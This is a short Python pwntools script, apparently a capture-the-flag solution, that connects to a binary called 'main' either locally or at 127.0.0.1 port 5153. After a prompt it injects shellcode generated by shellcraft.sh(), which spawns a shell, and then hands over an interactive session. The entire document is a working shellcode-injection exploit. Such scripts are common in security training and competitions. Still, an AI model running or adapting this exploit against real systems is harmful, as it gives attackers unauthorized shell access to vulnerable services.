#!/usr/bin/env python3

from pwn import *

exe = ELF("./main")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 5153)

    return r


def main():
    r = conn()

    r.sendlineafter(b': ', asm(shellcraft.sh()))

    r.interactive()


if __name__ == "__main__":
    main()
